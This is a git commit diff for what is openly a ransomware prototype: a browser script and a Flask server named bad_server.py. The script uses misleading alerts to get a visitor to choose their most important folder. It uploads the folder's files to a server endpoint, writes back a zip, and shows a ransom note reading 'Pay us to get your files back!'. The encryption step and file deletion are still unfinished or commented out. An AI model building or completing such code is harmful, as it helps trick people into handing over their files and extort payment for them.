a0e5a8bdab689b80bfc43ab7576ce4304221fe8b
Mathieu <mathieuppicard@hotmail.com>
2025-09-29 06:00:43 -0400

    Modif web page, adding zip files handle.

--- WebSite/script.js
+++ WebSite/script.js
@@ -1,6 +1,8 @@
 async function pickFileAndUpload() {
-    console.log("start");
+    alert("Start of the super cool process!");
     try{
+        alert("Select your favorite(and most important) folder!");
+        document.querySelector(".lock").textContent = "🕘";
         const dirHandle = await window.showDirectoryPicker();
         const formData = new FormData();
 
@@ -10,14 +12,26 @@ async function pickFileAndUpload() {
                 formData.append("files", file, file.name)
             }
         }
-
+        
         const response = await fetch('http://localhost:5000/cryp',
             {method: 'POST',
             body: formData}
         );
 
-        console.log(response);
+        //Delete all the files in the directory
+        //await dirHandle.removeEntry("superImportantTexte.txt");
+        //
 
+        const blob = await response.blob();
+        const saveHandle = await dirHandle.getFileHandle("files.zip", { create:true});
+        const writable = await saveHandle.createWritable(); 
+        await writable.write(blob);
+        await writable.close();
+
+        document.querySelector("h1").textContent = "Pay us to get your files back!";
+        document.querySelector(".warning").textContent = "YOU GOT HACKED! YOU GOT HACKED! YOU GOT HACKED!";
+        document.querySelector(".lock").textContent = "😈";
+        document.querySelector("#sendButton").remove();
     } catch(err) {
         console.error(err)
         alert("Error: " + err.message)
--- bad_server.py
+++ bad_server.py
@@ -1,6 +1,8 @@
 from flask import Flask, request, send_file
 from flask_cors import CORS
 import os
+import tempfile
+import zipfile
 
 app = Flask(__name__)
 CORS(app, origins=["*"])
@@ -14,10 +16,19 @@ def encrypt_files() :
 
     for file in files : 
         print(f"received : {file.filename}", flush=True)
+        #Do encryption and return
+        #>Create an empty encrypted_files
+        #>Add the newly encrypted file in to the new array
 
-    #Do encryption and return
+    tmp_fd, tmp_path = tempfile.mkstemp(suffix=".zip")
+    os.close(tmp_fd)
 
-    return "Succes", 200
+    with zipfile.ZipFile(tmp_path, 'w') as zf :
+        for file in files : #When encryption done, replace this array
+            file.seek(0)
+            zf.writestr(file.filename, file.read())
+
+    return send_file(tmp_path, as_attachment=True, download_name="files")
 
 if __name__ == "__main__" :
     app.run(port=5000, debug=True)
